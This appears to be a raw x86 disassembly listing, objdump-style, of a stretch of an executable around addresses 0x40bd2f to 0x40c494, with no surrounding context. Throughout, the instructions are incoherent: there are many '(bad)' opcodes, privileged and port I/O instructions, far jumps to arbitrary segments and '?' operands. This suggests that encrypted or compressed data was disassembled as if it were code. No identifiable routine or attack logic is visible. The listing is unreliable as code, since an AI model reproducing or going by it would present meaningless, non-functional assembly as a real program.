  40bd2f:	and    ebx,DWORD PTR [eax-0x6bfbb8cb]
  40bd35:	into   
  40bd36:	fisttp DWORD PTR [edi+0x3c]
  40bd39:	mov    bl,0xa0
  40bd3b:	xor    ebp,ebx
  40bd3d:	jg     0x40bd29
  40bd3f:	sub    eax,0xa4ed6068
  40bd44:	inc    ebx
  40bd45:	mov    eax,ds:0x555b189c
  40bd4a:	pop    ebp
  40bd4b:	daa    
  40bd4c:	jmp    0xb4ed:0x36c1eca0
  40bd53:	add    al,0x4a
  40bd55:	or     BYTE PTR [esp+edx*1],cl
  40bd58:	push   cs
  40bd59:	xor    edi,DWORD PTR [esi-0x3105b53d]
  40bd5f:	push   cs
  40bd60:	cmp    esi,0x9acad16d
  40bd66:	in     eax,0xcf
  40bd68:	push   ecx
  40bd69:	rol    DWORD PTR [ecx-0x752ef9de],cl
  40bd6f:	(bad)  
  40bd71:	xor    al,0xce
  40bd73:	pop    es
  40bd74:	fwait
  40bd75:	pop    ecx
  40bd76:	add    al,0xd4
  40bd78:	jbe    0x40bddb
  40bd7a:	jg     0x40bd3f
  40bd7c:	lea    edx,[eax+ebp*1-0xf]
  40bd80:	gs inc edx
  40bd82:	adc    al,BYTE PTR [ecx+0x18f3b3a0]
  40bd88:	xchg   DWORD PTR [ebp+0x10608701],esp
  40bd8e:	mov    cl,0x59
  40bd90:	stc    
  40bd91:	int    0x49
  40bd93:	out    0x8f,eax
  40bd95:	dec    edx
  40bd96:	add    al,0xde
  40bd98:	ss test edi,0x7c36e9f3
  40bd9f:	cmc    
  40bda0:	add    al,0x66
  40bda2:	add    eax,0xcb841e4d
  40bda7:	stc    
  40bda8:	je     0x40bdd7
  40bdaa:	fld    st(3)
  40bdac:	jle    0x40bd57
  40bdae:	ret    
  40bdaf:	pop    ecx
  40bdb0:	add    eax,0x17a5aeee
  40bdb5:	mov    bh,0x5e
  40bdb7:	mov    esp,0x7cc4da0b
  40bdbc:	sbb    edx,esp
  40bdbe:	dec    edx
  40bdbf:	cli    
  40bdc0:	(bad)  
  40bdc1:	or     al,BYTE PTR [edi+0x540d385c]
  40bdc7:	data16 jb 0x40be1c
  40bdca:	pop    ebp
  40bdcb:	adc    edi,DWORD PTR [ebp-0x17]
  40bdce:	enter  0xf457,0x56
  40bdd2:	popa   
  40bdd3:	push   es
  40bdd4:	in     eax,dx
  40bdd5:	adc    bl,BYTE PTR [ecx]
  40bdd7:	jnp    0x40bdf2
  40bdd9:	test   DWORD PTR [ebx-0x20],edx
  40bddc:	xchg   ebp,eax
  40bddd:	mov    edx,0x66c2ed51
  40bde2:	add    DWORD PTR [edi-0xce247d2],ebp
  40bde8:	pop    ebp
  40bde9:	cmc    
  40bdea:	jmp    0x40bda6
  40bdec:	into   
  40bded:	inc    ebp
  40bdee:	repnz mov cl,0xbe
  40bdf1:	push   ds
  40bdf2:	adc    eax,0xab9e1c6f
  40bdf7:	mov    ds:0xdf8cdc97,al
  40bdfc:	push   esi
  40bdfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdfe:	scas   eax,DWORD PTR es:[edi]
  40bdff:	retf   0x6f54
  40be02:	out    dx,al
  40be03:	ficomp WORD PTR [ebx+ebp*4]
  40be06:	xchg   DWORD PTR [ebp+0x76],ecx
  40be09:	jns    0x40bdab
  40be0b:	addr16 xor eax,0x22f40587
  40be11:	xchg   esi,eax
  40be12:	mov    ch,0x7b
  40be14:	jp     0x40bdf4
  40be16:	mov    edi,0x28946250
  40be1b:	cmp    DWORD PTR [esi-0x50],esi
  40be1e:	mov    ah,0x8e
  40be20:	pop    esi
  40be21:	dec    ebp
  40be22:	jge    0x40be6d
  40be24:	repnz and edx,DWORD PTR [ecx-0x67468418]
  40be2b:	loope  0x40bdd6
  40be2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be2e:	adc    BYTE PTR [eax-0x7ca95f67],ah
  40be34:	and    al,0xa1
  40be36:	out    0x37,al
  40be38:	bound  eax,QWORD PTR [ebx-0x57a4833]
  40be3e:	push   edx
  40be3f:	dec    edi
  40be40:	and    DWORD PTR [ecx],ebx
  40be42:	mov    esi,esi
  40be44:	idiv   DWORD PTR [eax+0x4269d9d3]
  40be4a:	out    0x2a,al
  40be4c:	jge    0x40be40
  40be4e:	push   ecx
  40be4f:	add    BYTE PTR fs:[ebx],dh
  40be52:	jmp    0x40be4b
  40be54:	xchg   ecx,eax
  40be55:	into   
  40be56:	push   cs
  40be57:	xchg   ecx,eax
  40be58:	mov    ?,WORD PTR [edi+0x70]
  40be5b:	loopne 0x40be32
  40be5d:	in     eax,0x63
  40be5f:	xor    BYTE PTR [edx],dl
  40be61:	xchg   DWORD PTR [esi],eax
  40be63:	push   ss
  40be64:	in     eax,dx
  40be65:	sub    al,0x91
  40be67:	push   ebx
  40be68:	jae    0x40bee9
  40be6a:	xchg   ecx,eax
  40be6b:	int3   
  40be6c:	dec    esi
  40be6d:	test   DWORD PTR [ebx+0x7385eb42],ebx
  40be73:	or     BYTE PTR [eax+0x1aea448b],al
  40be79:	inc    edi
  40be7a:	loop   0x40be4b
  40be7c:	xor    dl,dh
  40be7e:	mov    eax,ds:0x5446ecfb
  40be83:	es ret 0xf13d
  40be87:	add    eax,0x85d4068d
  40be8c:	iret   
  40be8d:	ja     0x40be68
  40be8f:	mov    ebx,0x4096ebc4
  40be94:	inc    ebp
  40be95:	iret   
  40be96:	int3   
  40be97:	mov    WORD PTR [eax+edi*1-0x732350a9],?
  40be9e:	in     eax,0x86
  40bea0:	sub    esi,esi
  40bea2:	in     al,0x7f
  40bea4:	mov    ebx,0x3a11e78
  40bea9:	add    DWORD PTR [edi-0x4c],edx
  40beac:	fistp  WORD PTR [ecx]
  40beae:	sti    
  40beaf:	push   edi
  40beb0:	ja     0x40bf10
  40beb2:	jns    0x40be85
  40beb4:	cmp    al,0xcf
  40beb6:	pop    edi
  40beb7:	fild   DWORD PTR [edi-0x18]
  40beba:	imul   ebx,edx,0xa1709a32
  40bec0:	push   0xbd6486db
  40bec5:	shl    DWORD PTR [edx-0x5d],cl
  40bec8:	jno    0x40beeb
  40beca:	add    al,0x66
  40becc:	pop    ebp
  40becd:	into   
  40bece:	push   esp
  40becf:	adc    esp,DWORD PTR [esi+edx*4+0x63e13d2]
  40bed6:	and    ah,BYTE PTR [eax+0x36]
  40bed9:	stos   DWORD PTR es:[edi],eax
  40beda:	sub    dl,BYTE PTR [edi]
  40bedc:	in     al,dx
  40bedd:	or     eax,0x4f8bb9b3
  40bee2:	addr16 cmp esi,ecx
  40bee5:	pop    ss
  40bee6:	mov    bl,0xcd
  40bee8:	jp     0x40bf27
  40beea:	(bad)  
  40beeb:	lods   al,BYTE PTR ds:[esi]
  40beec:	sahf   
  40beed:	fistp  DWORD PTR [eax+0x35]
  40bef0:	sub    eax,0x74f19ba2
  40bef5:	jae    0x40bed0
  40bef7:	mov    bl,BYTE PTR [esi-0x3475aa40]
  40befd:	xor    al,0x6f
  40beff:	test   eax,0xa9663a58
  40bf04:	lea    eax,[eax-0x712dbef5]
  40bf0a:	outs   dx,BYTE PTR ds:[esi]
  40bf0b:	repz push 0xffffff93
  40bf0e:	loopne 0x40bf54
  40bf10:	cmp    eax,eax
  40bf12:	push   ebx
  40bf13:	mov    ebx,0x566b5f48
  40bf18:	(bad)  
  40bf19:	push   eax
  40bf1a:	sub    eax,0x6589cab
  40bf1f:	xchg   ecx,eax
  40bf20:	add    bp,bx
  40bf23:	nop
  40bf24:	jmp    0xd134:0xebac2f17
  40bf2b:	jae    0x40bf7c
  40bf2d:	cmp    ebp,DWORD PTR [eax]
  40bf2f:	cld    
  40bf30:	loope  0x40beff
  40bf32:	sbb    BYTE PTR [ebp+0x14],dl
  40bf35:	icebp  
  40bf36:	xchg   esp,eax
  40bf37:	scas   eax,DWORD PTR es:[edi]
  40bf38:	cli    
  40bf39:	(bad)  
  40bf3a:	dec    ebx
  40bf3b:	rol    BYTE PTR [ebp-0x9e74198],cl
  40bf41:	jmp    0x748ea5d7
  40bf46:	enter  0xb178,0x49
  40bf4a:	rcl    edi,1
  40bf4c:	xchg   ebp,eax
  40bf4d:	fsubr  QWORD PTR [esi]
  40bf4f:	adc    DWORD PTR [edx],esi
  40bf51:	pop    ebx
  40bf52:	sar    DWORD PTR [edx],0xe1
  40bf55:	clc    
  40bf56:	out    0x89,al
  40bf58:	fadd   QWORD PTR [esp+ebx*8-0x46]
  40bf5c:	lods   eax,DWORD PTR ds:[esi]
  40bf5d:	adc    eax,0xf9ab19b5
  40bf62:	xor    bh,bl
  40bf64:	stos   DWORD PTR es:[edi],eax
  40bf65:	jo     0x40bf34
  40bf67:	sar    DWORD PTR [ebx],0xe6
  40bf6a:	repz mov edx,0xf913c54c
  40bf70:	ds leave 
  40bf72:	inc    eax
  40bf73:	ror    BYTE PTR [eax],0x7
  40bf76:	add    al,0xdb
  40bf78:	or     dh,bh
  40bf7a:	xchg   esi,eax
  40bf7b:	push   es
  40bf7c:	loope  0x40bf72
  40bf7e:	cmp    BYTE PTR [esi+ecx*2+0x6],0xce
  40bf83:	into   
  40bf84:	jl     0x40bf98
  40bf86:	xchg   edi,eax
  40bf87:	add    esi,0xffffffcf
  40bf8a:	cmp    dh,dl
  40bf8c:	stos   BYTE PTR es:[edi],al
  40bf8d:	(bad)  
  40bf8e:	dec    esp
  40bf8f:	test   ebx,edi
  40bf91:	add    BYTE PTR [esi-0x52],bh
  40bf94:	push   edi
  40bf95:	jmp    0x6a91:0x1953df48
  40bf9c:	scas   eax,DWORD PTR es:[edi]
  40bf9d:	or     BYTE PTR [ecx+0x6d],0xf0
  40bfa1:	leave  
  40bfa2:	sbb    DWORD PTR [eax+ebx*8],0xdf2f6f50
  40bfa9:	cli    
  40bfaa:	retf   0x53c1
  40bfad:	icebp  
  40bfae:	pop    edx
  40bfaf:	push   cs
  40bfb0:	pop    esi
  40bfb1:	test   DWORD PTR [bp-0x6a],edx
  40bfb5:	clc    
  40bfb6:	and    bh,al
  40bfb8:	inc    ebp
  40bfb9:	fild   DWORD PTR [esi-0x588cafbb]
  40bfbf:	dec    eax
  40bfc0:	and    eax,0xe37203b
  40bfc5:	cmc    
  40bfc6:	std    
  40bfc7:	inc    edi
  40bfc8:	std    
  40bfc9:	and    al,0x7b
  40bfcb:	in     eax,dx
  40bfcc:	out    0xad,eax
  40bfce:	add    ecx,DWORD PTR [edx]
  40bfd0:	or     al,0x10
  40bfd2:	mov    ecx,0x64bd25df
  40bfd7:	out    dx,al
  40bfd8:	push   esi
  40bfd9:	adc    DWORD PTR [ebx+esi*8],ebx
  40bfdc:	in     eax,0xa7
  40bfde:	aaa    
  40bfdf:	sub    al,0x34
  40bfe1:	mov    WORD PTR [ebx+0x2d813285],?
  40bfe7:	push   ebx
  40bfe8:	arpl   WORD PTR [edi],di
  40bfea:	retf   0x1364
  40bfed:	ss stos DWORD PTR es:[edi],eax
  40bfef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bff0:	sbb    BYTE PTR [ebp-0x6b57f9fb],ch
  40bff6:	lock pop edx
  40bff8:	out    0xe6,eax
  40bffa:	pop    ebx
  40bffb:	jns    0x40bfef
  40bffd:	xchg   ecx,eax
  40bffe:	cmp    eax,0x8a51f7c0
  40c003:	(bad)  
  40c004:	mov    bl,0x13
  40c006:	push   ss
  40c007:	je     0x40c058
  40c009:	gs int 0x93
  40c00c:	jne    0x40c026
  40c00e:	dec    eax
  40c00f:	(bad)  
  40c010:	xchg   edx,eax
  40c011:	rcr    DWORD PTR [eax-0x57],1
  40c014:	stc    
  40c015:	(bad)  
  40c016:	cmp    eax,0x183495a7
  40c01b:	pause  
  40c01d:	shl    BYTE PTR [esi-0x5f4fefa0],1
  40c023:	mov    esi,0x26a629e0
  40c028:	mov    ah,0xaf
  40c02a:	dec    ebp
  40c02b:	mov    BYTE PTR [ecx-0x2cbd2848],bh
  40c031:	dec    edi
  40c032:	sub    DWORD PTR [esi-0x2c6898a],esp
  40c038:	jmp    0xfe4ff691
  40c03d:	cmp    cl,BYTE PTR [ecx]
  40c03f:	jns    0x40c029
  40c041:	ror    BYTE PTR [esi-0x6d0181e0],0xea
  40c048:	(bad)  
  40c049:	sti    
  40c04a:	std    
  40c04b:	dec    edi
  40c04c:	outs   dx,BYTE PTR ds:[esi]
  40c04d:	jle    0x40c036
  40c04f:	adc    BYTE PTR [edx*2+0x52f2d1cc],dh
  40c056:	push   ebx
  40c057:	lds    edx,FWORD PTR [edx+0x78]
  40c05a:	clc    
  40c05b:	rcl    DWORD PTR [esi+edx*4-0x20],1
  40c05f:	stc    
  40c060:	inc    esi
  40c061:	(bad)  
  40c062:	pop    edi
  40c063:	hlt    
  40c064:	fs stos DWORD PTR es:[edi],eax
  40c066:	mov    DWORD PTR [ecx+0x16100ae],ecx
  40c06c:	in     eax,0xd7
  40c06e:	shl    BYTE PTR [edi-0x34],cl
  40c071:	jns    0x40c098
  40c073:	scas   eax,DWORD PTR es:[edi]
  40c074:	pop    ecx
  40c075:	sahf   
  40c076:	cs mov edi,0x2c968195
  40c07c:	xor    DWORD PTR [eax],edx
  40c07e:	nop
  40c07f:	push   edi
  40c080:	xor    ch,dl
  40c082:	cli    
  40c083:	ja     0x40c081
  40c085:	mov    bh,0x5
  40c087:	xor    DWORD PTR [eax+0x7127e78b],esp
  40c08d:	ja     0x40c054
  40c08f:	clts   
  40c091:	adc    BYTE PTR [di],dh
  40c094:	adc    eax,0x9efa2609
  40c099:	nop
  40c09a:	dec    ebx
  40c09b:	cmp    ebx,DWORD PTR [edi-0x537d128f]
  40c0a1:	sti    
  40c0a2:	sub    eax,0x88eee37f
  40c0a7:	rcr    BYTE PTR [esi],1
  40c0a9:	inc    ecx
  40c0aa:	and    DWORD PTR [edi],0xffffff88
  40c0ad:	xchg   ebx,eax
  40c0ae:	sbb    al,BYTE PTR [edi]
  40c0b0:	arpl   di,dx
  40c0b2:	jno    0x40c12d
  40c0b4:	xchg   esp,eax
  40c0b5:	inc    ebx
  40c0b6:	jo     0x40c122
  40c0b8:	fld    st(7)
  40c0ba:	test   BYTE PTR [edx+0x4e4f5614],al
  40c0c0:	mov    edx,0xbb9e07e1
  40c0c5:	ss cwde 
  40c0c7:	cs push ecx
  40c0c9:	jns    0x40c0c0
  40c0cb:	loopne 0x40c075
  40c0cd:	xor    al,0xcf
  40c0cf:	fwait
  40c0d0:	push   eax
  40c0d1:	or     esp,DWORD PTR [edx]
  40c0d3:	(bad)  
  40c0d4:	scas   eax,DWORD PTR es:[edi]
  40c0d5:	mov    edi,0xbb160170
  40c0da:	xchg   esp,eax
  40c0db:	popa   
  40c0dc:	stos   DWORD PTR es:[edi],eax
  40c0dd:	or     BYTE PTR [ecx-0x3e],ch
  40c0e0:	sbb    BYTE PTR [esi-0x74],bh
  40c0e3:	fist   DWORD PTR [edi+ebx*1-0x32]
  40c0e7:	sbb    cl,BYTE PTR ds:0xa9724ad8
  40c0ed:	std    
  40c0ee:	jmp    0x40c12b
  40c0f0:	mov    ds:0x4878a2c0,eax
  40c0f5:	mov    dh,BYTE PTR [ecx-0x12]
  40c0f8:	test   eax,0x874ecfd4
  40c0fd:	inc    esi
  40c0fe:	dec    esp
  40c0ff:	sbb    cl,BYTE PTR [esi]
  40c101:	(bad)  
  40c102:	jno    0x40c10a
  40c104:	loope  0x40c0aa
  40c106:	outs   dx,DWORD PTR ds:[esi]
  40c107:	(bad)  [ebx-0x47]
  40c10a:	cld    
  40c10b:	dec    edx
  40c10c:	daa    
  40c10d:	in     eax,dx
  40c10e:	inc    edx
  40c10f:	idiv   DWORD PTR [eax+0x27e7bce1]
  40c115:	out    dx,eax
  40c116:	jmp    0x40c12a
  40c118:	mov    ebx,0xd0380885
  40c11d:	gs fwait
  40c11f:	test   al,0x72
  40c121:	and    ecx,ecx
  40c123:	sahf   
  40c124:	adc    eax,DWORD PTR [ebx]
  40c126:	dec    eax
  40c127:	mov    esp,DWORD PTR [ebx+0x21e6f1ad]
  40c12d:	pop    es
  40c12e:	or     al,BYTE PTR [edx+0x4e23136f]
  40c134:	mov    cl,0xb3
  40c136:	fwait
  40c137:	sbb    eax,0xce095bac
  40c13c:	mov    eax,0x6c3d2f64
  40c141:	mov    ebp,0x9697ca45
  40c146:	cs iret 
  40c148:	call   DWORD PTR [esi]
  40c14a:	ror    DWORD PTR [edi-0x6a],0xe0
  40c14e:	out    0x66,al
  40c150:	push   eax
  40c151:	push   esp
  40c152:	stos   DWORD PTR es:[edi],eax
  40c153:	shl    BYTE PTR [edi-0x2a],0x22
  40c157:	inc    edi
  40c158:	xchg   esp,eax
  40c159:	dec    ecx
  40c15a:	jle    0x40c19a
  40c15c:	or     al,0xa1
  40c15e:	outs   dx,DWORD PTR ds:[esi]
  40c15f:	out    0xda,al
  40c161:	add    dh,ch
  40c163:	mov    eax,ds:0x3096b42b
  40c168:	pushf  
  40c169:	aam    0x5a
  40c16b:	mov    edi,0xc7240182
  40c170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c171:	jnp    0x40c160
  40c173:	(bad)  
  40c174:	les    eax,FWORD PTR [esp+edx*2-0x23]
  40c178:	nop
  40c179:	(bad)  
  40c17a:	sbb    eax,0x9a3b0ea3
  40c17f:	ins    BYTE PTR es:[edi],dx
  40c180:	cld    
  40c181:	push   eax
  40c182:	mov    ebp,0xdaf5de2b
  40c187:	adc    esp,DWORD PTR [eax]
  40c189:	outs   dx,DWORD PTR ds:[esi]
  40c18a:	add    ecx,DWORD PTR [esi-0xa]
  40c18d:	in     al,0x14
  40c18f:	aam    0x30
  40c191:	js     0x40c1f2
  40c193:	cmp    al,0x37
  40c195:	sbb    edx,esp
  40c197:	rcr    cl,1
  40c199:	repz jl 0x40c184
  40c19c:	push   cs
  40c19d:	adc    eax,0x7683946b
  40c1a2:	pushf  
  40c1a3:	mov    dl,0xd1
  40c1a5:	cld    
  40c1a6:	and    esp,DWORD PTR [ebp+0x60]
  40c1a9:	(bad)  
  40c1aa:	(bad)  
  40c1ab:	adc    bh,ah
  40c1ad:	enter  0xd520,0xd8
  40c1b1:	aaa    
  40c1b2:	(bad)  
  40c1b3:	in     al,dx
  40c1b4:	popf   
  40c1b5:	hlt    
  40c1b6:	cmp    BYTE PTR [eax],dh
  40c1b8:	neg    DWORD PTR [edi+0x62ed375b]
  40c1be:	into   
  40c1bf:	jbe    0x40c15d
  40c1c1:	mov    eax,0xde9717e9
  40c1c6:	dec    ebp
  40c1c7:	dec    eax
  40c1c8:	pop    edi
  40c1c9:	(bad)  
  40c1ca:	fidivr DWORD PTR [edx]
  40c1cc:	aas    
  40c1cd:	mov    cl,0x1c
  40c1cf:	mov    al,0x5b
  40c1d1:	sahf   
  40c1d2:	pop    esp
  40c1d3:	push   0xffffffd2
  40c1d5:	int    0x84
  40c1d7:	mov    bh,0x7d
  40c1d9:	xchg   ecx,eax
  40c1da:	(bad)  
  40c1db:	fpatan 
  40c1dd:	jbe    0x40c1fc
  40c1df:	pop    esp
  40c1e0:	shl    BYTE PTR [esi+0x1338a3c5],cl
  40c1e6:	mov    dl,BYTE PTR [eax]
  40c1e8:	out    0xc8,al
  40c1ea:	cmp    ecx,edi
  40c1ec:	adc    BYTE PTR [ecx+ecx*1-0x320f3033],al
  40c1f3:	sahf   
  40c1f4:	dec    ebp
  40c1f5:	nop
  40c1f6:	jno    0x40c190
  40c1f8:	mov    cl,0x90
  40c1fa:	pop    edx
  40c1fb:	daa    
  40c1fc:	imul   eax,DWORD PTR [ebp+ebp*1-0x3833d441],0xffffffe4
  40c204:	mov    edx,DWORD PTR [ebx+0x52]
  40c207:	inc    esi
  40c208:	into   
  40c209:	pop    eax
  40c20a:	mov    ebp,0xb29a9213
  40c20f:	retf   0x6bce
  40c212:	adc    DWORD PTR [edx+0x2a507147],ecx
  40c218:	add    bh,bl
  40c21a:	test   al,0x5c
  40c21c:	scas   al,BYTE PTR es:[edi]
  40c21d:	jb     0x40c249
  40c21f:	call   0x1973:0x8f2a336b
  40c226:	and    eax,0xfdc2211f
  40c22b:	cmp    al,0x44
  40c22d:	icebp  
  40c22e:	push   ds
  40c22f:	mov    ds:0x8dd8f387,al
  40c234:	in     eax,dx
  40c235:	mov    ch,0x3
  40c237:	cmc    
  40c238:	aas    
  40c239:	push   eax
  40c23a:	xor    bh,bh
  40c23c:	jmp    0xff453ccd
  40c241:	retf   0x1ab2
  40c244:	pushw  0x1546
  40c248:	in     al,0x62
  40c24a:	ret    
  40c24b:	ja     0x40c25d
  40c24d:	shr    edi,cl
  40c24f:	pop    ss
  40c250:	iret   
  40c251:	hlt    
  40c252:	push   esp
  40c253:	xor    DWORD PTR [edx+0x8],ecx
  40c256:	add    eax,0xcb27f845
  40c25b:	out    dx,al
  40c25c:	dec    ebx
  40c25d:	pop    esi
  40c25e:	xchg   ebp,eax
  40c25f:	in     eax,0x1a
  40c261:	cwde   
  40c262:	and    DWORD PTR [ecx+0x68c09582],0x5b7f28bf
  40c26c:	(bad)  
  40c26d:	push   esi
  40c26e:	call   FWORD PTR [edi-0x384b2702]
  40c274:	dec    eax
  40c275:	jae    0x40c260
  40c277:	mov    ds:0x6c72c,eax
  40c27c:	test   BYTE PTR [edi+0x3f],dl
  40c27f:	mov    edi,0x42f9f5ff
  40c284:	mov    cl,0xba
  40c286:	and    al,0xdd
  40c288:	or     BYTE PTR [eax],0x32
  40c28b:	jl     0x40c2e8
  40c28d:	cmpps  xmm3,XMMWORD PTR [ecx+ebx*8],0x15
  40c292:	sbb    al,0x76
  40c294:	cmp    eax,0x189f5241
  40c299:	xchg   esi,eax
  40c29a:	xchg   ecx,eax
  40c29b:	mov    BYTE PTR [esi],bh
  40c29d:	pop    esi
  40c29e:	shr    esp,cl
  40c2a0:	fcomp  QWORD PTR ds:0xdf3d0a7b
  40c2a6:	mov    bh,0xdc
  40c2a8:	or     eax,0x6990c0a
  40c2ad:	push   eax
  40c2ae:	in     eax,0x36
  40c2b0:	test   al,0xc2
  40c2b2:	adc    eax,0x1d5de257
  40c2b7:	mov    bl,0x3a
  40c2b9:	fisttp WORD PTR [edx+0x11ccc6e]
  40c2bf:	pushf  
  40c2c0:	cmp    BYTE PTR ds:0xbfa9a563,bl
  40c2c6:	push   cs
  40c2c7:	ds leave 
  40c2c9:	call   0xac034030
  40c2ce:	sbb    DWORD PTR [ebp-0x70],ebp
  40c2d1:	outs   dx,BYTE PTR ds:[esi]
  40c2d2:	imul   edi,DWORD PTR [edi-0x4e],0x96095a1c
  40c2d9:	mov    ebp,0xd96ee12d
  40c2de:	xchg   esp,eax
  40c2df:	test   DWORD PTR [esi-0x620d406b],esi
  40c2e5:	test   BYTE PTR [eax],al
  40c2e7:	pop    eax
  40c2e8:	jg     0x40c320
  40c2ea:	not    DWORD PTR [ebx]
  40c2ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ed:	push   ss
  40c2ee:	dec    ebp
  40c2ef:	jl     0x40c33c
  40c2f1:	push   ecx
  40c2f2:	into   
  40c2f3:	out    dx,al
  40c2f4:	ss aad 0xb4
  40c2f7:	sbb    eax,0x59c10291
  40c2fc:	mov    eax,ds:0xc332215c
  40c301:	mov    edx,DWORD PTR [edi-0x58]
  40c304:	xchg   ebp,eax
  40c305:	imul   ecx,DWORD PTR ss:[esi],0x1ba93caa
  40c30c:	push   cs
  40c30d:	xor    dl,BYTE PTR [esi]
  40c30f:	stc    
  40c310:	jmp    0xee02:0x7e2cd3b9
  40c317:	icebp  
  40c318:	stos   DWORD PTR es:[edi],eax
  40c319:	outs   dx,DWORD PTR ds:[esi]
  40c31a:	dec    edi
  40c31b:	cmc    
  40c31c:	inc    ebp
  40c31d:	cmp    eax,DWORD PTR ds:0x2601a4e6
  40c323:	cmp    edi,DWORD PTR [esi-0x75]
  40c326:	ret    
  40c327:	ja     0x40c367
  40c329:	je     0x40c2d1
  40c32b:	ror    BYTE PTR [esi],1
  40c32d:	ins    BYTE PTR es:[edi],dx
  40c32e:	out    dx,eax
  40c32f:	cmp    edx,ebx
  40c331:	emms   
  40c333:	adc    DWORD PTR cs:[edx-0x34],esi
  40c337:	and    eax,0x2083dba0
  40c33c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c33d:	out    0x10,al
  40c33f:	arpl   WORD PTR [esp+edx*1],di
  40c342:	ficom  WORD PTR [esi+ebx*2-0x36]
  40c346:	jnp    0x40c2d6
  40c348:	imul   eax,ecx,0x76
  40c34b:	push   edx
  40c34c:	icebp  
  40c34d:	push   ebp
  40c34e:	sbb    BYTE PTR [eax],0x3c
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	cmp    BYTE PTR [edi+0x4d],ah
  40c355:	sbb    DWORD PTR [ebp-0x2d],esp
  40c358:	(bad)  
  40c359:	mov    ebx,0xb64d5718
  40c35e:	mov    eax,0x77f35840
  40c363:	push   0x37
  40c365:	and    ecx,edx
  40c367:	push   esi
  40c368:	aas    
  40c369:	pop    ds
  40c36a:	repz jns 0x40c3aa
  40c36d:	out    dx,al
  40c36e:	and    ebp,edi
  40c370:	push   eax
  40c371:	repnz mov bl,0x13
  40c374:	mov    gs,WORD PTR [edi]
  40c376:	int    0x80
  40c378:	ret    0xaf09
  40c37b:	(bad)  
  40c37c:	je     0x40c317
  40c37e:	out    0x24,eax
  40c380:	pop    DWORD PTR fs:[ecx]
  40c383:	mov    esi,0x41616807
  40c388:	int3   
  40c389:	ret    
  40c38a:	push   es
  40c38b:	stos   BYTE PTR es:[edi],al
  40c38c:	and    DWORD PTR [ecx+0x40],esp
  40c38f:	push   cs
  40c390:	push   0x4
  40c392:	push   edi
  40c393:	(bad)  
  40c396:	cmp    al,0xab
  40c398:	out    dx,eax
  40c399:	xor    eax,0x6b4ad6e4
  40c39e:	loope  0x40c41a
  40c3a0:	mov    DWORD PTR ds:0xd4979981,0x9b34b6f5
  40c3aa:	and    DWORD PTR [ebp+0xd6c477e],0xffffff94
  40c3b1:	test   eax,0x2ec1e450
  40c3b6:	daa    
  40c3b7:	push   es
  40c3b8:	pusha  
  40c3b9:	pop    esi
  40c3ba:	in     eax,0x28
  40c3bc:	push   edi
  40c3bd:	xchg   edi,eax
  40c3be:	jecxz  0x40c399
  40c3c0:	adc    ebp,DWORD PTR [ecx-0x6f]
  40c3c3:	mov    ebx,0x4a73967c
  40c3c8:	adc    DWORD PTR [ecx+edi*4],ecx
  40c3cb:	popf   
  40c3cc:	ror    BYTE PTR [edi],1
  40c3ce:	adc    ah,BYTE PTR [edi]
  40c3d0:	xchg   ebx,eax
  40c3d1:	pop    esi
  40c3d2:	jmp    0x2150d93b
  40c3d7:	fcom   QWORD PTR [edx+edi*8]
  40c3da:	comiss xmm6,xmm4
  40c3dd:	and    al,0x12
  40c3df:	ret    
  40c3e0:	aas    
  40c3e1:	pop    ss
  40c3e2:	mov    dl,0xbf
  40c3e4:	(bad)  
  40c3e5:	mov    ah,0x67
  40c3e7:	and    esp,DWORD PTR [ebp-0x26]
  40c3ea:	ss clc 
  40c3ec:	pop    ds
  40c3ed:	xchg   DWORD PTR [edi-0x29],edx
  40c3f0:	popf   
  40c3f1:	and    DWORD PTR [ebx],ebp
  40c3f3:	pop    edx
  40c3f4:	adc    BYTE PTR [eax],cl
  40c3f6:	rcr    BYTE PTR [edx+0x459dc4e],cl
  40c3fc:	stos   BYTE PTR es:[edi],al
  40c3fd:	arpl   WORD PTR [ebp+0x5e],dx
  40c400:	lahf   
  40c401:	dec    ebx
  40c402:	adc    DWORD PTR [ebp+ebp*2+0x7c],0xbaf78030
  40c40a:	mov    ah,0xab
  40c40c:	sbb    BYTE PTR [ebp+0x4ddc68b5],dl
  40c412:	mov    dh,0x10
  40c414:	repnz xlat BYTE PTR ds:[ebx]
  40c416:	and    DWORD PTR [eax-0x7c],ecx
  40c419:	fcmovu st,st(5)
  40c41b:	mov    edx,DWORD PTR [edx-0x5f]
  40c41e:	in     eax,dx
  40c41f:	xor    esi,esi
  40c421:	sub    BYTE PTR [eax],dl
  40c423:	jnp    0x40c3db
  40c425:	and    DWORD PTR [ebx],esi
  40c427:	lds    ebx,FWORD PTR [esi-0x7e5ec913]
  40c42d:	add    bl,BYTE PTR [ecx-0x64]
  40c430:	inc    edi
  40c431:	test   DWORD PTR [ebp-0x6d],0xffca8a75
  40c438:	xor    ch,al
  40c43a:	cmp    ebp,DWORD PTR [esp+ebx*1]
  40c43d:	xor    BYTE PTR [ecx],0xa1
  40c440:	cmp    bl,BYTE PTR [ebx]
  40c442:	mov    bh,0xb1
  40c444:	push   esi
  40c445:	add    cl,BYTE PTR [esi+0x1beaec16]
  40c44b:	mov    eax,0x8c940bf8
  40c450:	mov    esp,0x45253f74
  40c455:	add    edx,DWORD PTR [eax+edi*8+0x6]
  40c459:	fninit 
  40c45b:	cmp    eax,0x51f9555a
  40c460:	and    BYTE PTR [ebx+0x4d74ef26],bl
  40c466:	xor    al,0x84
  40c468:	int3   
  40c469:	push   0xc5ba6740
  40c46e:	push   ss
  40c46f:	loope  0x40c40d
  40c471:	fsubr  st(6),st
  40c473:	xlat   BYTE PTR ds:[ebx]
  40c474:	xchg   esi,eax
  40c475:	inc    ebx
  40c476:	jb     0x40c416
  40c478:	sub    eax,DWORD PTR [eax+ebp*4+0x71f68f63]
  40c47f:	adc    bh,bl
  40c481:	jecxz  0x40c46a
  40c483:	xchg   esp,eax
  40c484:	aas    
  40c485:	packsswb mm4,mm7
  40c488:	sub    DWORD PTR [edi],eax
  40c48a:	xchg   edi,eax
  40c48b:	fiadd  DWORD PTR [edi]
  40c48d:	push   ecx
  40c48e:	arpl   WORD PTR ds:0xb24a8f46,bp
  40c494:	push   ebx
